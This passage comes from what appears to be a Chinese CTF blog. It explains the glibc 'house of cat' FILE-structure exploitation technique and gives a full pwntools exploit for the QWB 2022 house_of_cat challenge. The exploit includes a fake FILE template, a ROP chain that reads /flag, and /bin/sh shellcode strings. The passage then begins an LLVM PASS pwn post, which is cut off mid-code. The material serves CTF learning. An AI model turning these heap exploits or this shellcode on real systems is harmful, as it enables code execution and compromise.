*_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">			== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">			   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));		<span class="comment">// 计算was_writing使得为真</span></span><br><span class="line"><span class="comment">// #define _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</span></span><br><span class="line"><span class="comment">// #define _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))	<span class="comment">// 绕过检查进入_IO_switch_to_wget_mode函数</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)	<span class="comment">// 绕过检查进入子块</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)	<span class="comment">// 调用_IO_WOVERFLOW函数</span></span><br><span class="line"><span class="comment">// #define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>_IO_WOVERFLOW</code>函数作为宏定义，看一下汇编代码就可以理解，rdi就是我们传入的FILE的首地址，可以看到，rax成了我们的核心控制点，而rax的值也就是<code>fp-&gt;_wide_data</code>的值，rdx的值就是<code>fp-&gt;_wide_data-&gt;_IO_write_ptr</code>的值，注意在call汇编之前还会对rax进行一次赋值，那这里就随便控制了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x7fc411e82d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7fc411e82d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">0x7fc411e82d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">0x7fc411e82d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7fc411e82d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7fc411e82d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56              		 &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"></span><br><span class="line">0x7fc411e82d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7fc411e82d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">0x7fc411e82d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>绕过的检查有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_read_base != fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 或者 fp-&gt;_flags &amp; 0x0800 != 0</span><br><span class="line">fp-&gt;_mode = 0</span><br></pre></td></tr></table></figure>



<h3 id="house-of-cat-强网2022-1"><a href="#house-of-cat-强网2022-1" class="headerlink" title="house_of_cat(强网2022)"></a>house_of_cat(强网2022)</h3><p>这道题已经给出了house_of_apple2的解法，这里给出house_of_cat的解法也是预期解，同时整理一下模板：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./house_of_cat&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./house_of_cat&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    pld = <span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    pld = <span class="string">&#x27;CAT | r00t QWB QWXF$\xff\xff\xff\xff&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    <span class="comment"># only twice</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">8</span>)) - <span class="number">0xaf0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0xaf0</span>)</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)    <span class="comment"># bk_nextsize</span></span><br><span class="line">edit(<span class="number">2</span>, pld)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># largebin_attack</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1dd0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x468</span>, orw)     <span class="comment"># 10</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))    <span class="comment"># change top_chunk.size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf</span>))</span><br><span class="line">dbg()</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM PASS PWN</title>
    <url>/2022/08/10/Pwn/LLVM/</url>
    <content><![CDATA[<h2 id="LLVM-基础"><a href="#LLVM-基础" class="headerlink" title="LLVM 基础"></a>LLVM 基础</h2><p>着重关注IR这一个由clang编译源代码得到的中间代码，连接了编译器的前端与后端，LLVM PASS就是处理IR文件，通过opt将写好的so库优化已有的IR，遍历一遍IR同时对IR做一些操作。</p>
<blockquote>
<p>参考文章：</p>
<p><a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Pass入门导引 - 知乎 (zhihu.com)</a></p>
<p>[<a href="https://bbs.pediy.com/thread-273119.htm">原创]LLVM PASS类pwn题入门-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a href="https://www.anquanke.com/post/id/240748#h2-0">LLVM PASS PWN - 安全客，安全资讯平台 (anquanke.com)</a></p>
</blockquote>
<p>环境安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install clang</span><br><span class="line">sudo apt install llvm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu20以上的需要安装低版本的llvm和clang</span></span><br><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8		</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>IR有三种表达形式：</p>
<ul>
<li><code>.ll</code>：人类可以阅读的文本</li>
<li><code>.bc</code>：适合机器存储的二进制文件</li>
<li>内存表示</li>
</ul>
<p>相关转化的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm -S a.c -o a.ll		# .c -&gt; .ll</span><br><span class="line">clang -emit-llvm -c a.c -o a.bc		# .c -&gt; .bc</span><br><span class="line">llvm-as a.ll -o a.bc		# .ll -&gt; .bc</span><br><span class="line">llvm-dis a.bc -o a.ll		# .bc -&gt; .ll</span><br><span class="line">llc a.bc -o a.s			# .bc -&gt; .s</span><br></pre></td></tr></table></figure>

<p>可以寻找网上的一些实例进行学习，在学习的过程中，注意理解LLVM的一些API的调用(例如：<code>llvm::Value::getName</code>)，这将有助于我们进行代码审计，除此以外，着重关注<code>runOnFunction</code>这个具有重写功能的函数。</p>
<h2 id="yakagame"><a href="#yakagame" class="headerlink" title="yakagame"></a>yakagame</h2><blockquote>
<p>属于是只有原批才能出的LLVM😀😀（无想的一刀、斩尽牛杂、锅巴喷火、天动万象）</p>
</blockquote>
<p>题目给的readme：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">you can upload your exp code and when you think your exp code is good,just attack it</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;bash</span><br><span class="line">opt-8 -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">will execte</span><br></pre></td></tr></table></figure>

<p>相关调试命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm -S exp.c -o exp.ll</span><br><span class="line">gdb opt-8</span><br><span class="line"></span><br><span class="line">b llvm::Pass::preparePassManager</span><br><span class="line">run -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b *(&lt;so_base&gt; + offset)</span><br></pre></td></tr></table></figure>



<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>首先找到runOnFunction功能的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000215</span>D70 E0 <span class="number">6B</span> <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(<span class="type">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000215</span>D78 B0 <span class="number">6B</span> <span class="number">21</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000215</span>D80 <span class="number">80</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset sub_C880		<span class="comment">// runOnFunction</span></span><br></pre></td></tr></table></figure>

<p>进入<code>sub_C880</code>函数开逆：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v69 = a1;</span><br><span class="line">  v68 = a2;</span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  str[<span class="number">0</span>] = llvm::Value::getName(a2);</span><br><span class="line">  str[<span class="number">1</span>] = v2;</span><br><span class="line">  llvm::StringRef::operator <span class="title function_">std::string</span><span class="params">(v67, str)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="built_in">std</span>::operator==&lt;<span class="type">char</span>&gt;(v67, <span class="string">&quot;gamestart&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// 第一个函数名称必须是gamestart</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(cmd, &amp;src);                          <span class="comment">// \x92 